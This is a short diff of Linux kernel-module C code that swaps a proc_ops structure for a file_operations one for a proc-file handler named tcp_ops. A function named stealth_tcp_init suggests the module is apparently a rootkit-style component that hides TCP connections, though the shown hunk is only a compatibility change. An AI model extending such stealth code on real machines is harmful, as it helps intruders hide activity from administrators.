@@ -346,9 +346,10 @@ static ssize_t tcp_write(struct file *file, const char __user *ubuf,
 	return -EINVAL;
 }
 
-static const struct proc_ops tcp_ops = {
-	.proc_open = tcp_open, .proc_read = seq_read, .proc_write = tcp_write,
-	.proc_lseek = seq_lseek, .proc_release = single_release,
+static const struct file_operations tcp_ops = {
+	.owner = THIS_MODULE,
+	.open = tcp_open, .read = seq_read, .write = tcp_write,
+	.llseek = seq_lseek, .release = single_release,
 };
 
 int stealth_tcp_init(void)
